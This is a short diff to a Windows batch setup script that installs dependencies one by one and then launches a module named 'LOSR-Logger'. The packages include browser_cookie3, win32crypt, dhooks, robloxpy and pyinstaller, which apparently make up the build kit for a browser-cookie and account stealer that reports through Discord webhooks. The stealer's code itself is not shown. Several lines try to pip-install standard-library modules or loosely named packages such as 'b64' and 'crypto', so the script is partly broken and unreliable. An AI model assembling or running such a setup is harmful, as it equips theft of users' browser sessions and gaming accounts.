@@ -38,7 +38,25 @@ if not %errorlevel% == 0 (
     exit /b 1
 )
 
-python -m pip install -r requirements.txt
+pip install browser_cookie3
+pip install psutil
+pip install win32crypt
+pip install base64
+pip install b64
+pip install requests
+pip install discord
+pip install colorama
+pip install re
+pip install crypto
+pip install pycryptodome
+pip install marshal
+pip install zlib
+pip install requests
+pip install pystyle
+pip install pyinstaller
+pip install datetime
+pip install dhooks
+pip install robloxpy
 python -m LOSR-Logger
 
 pause
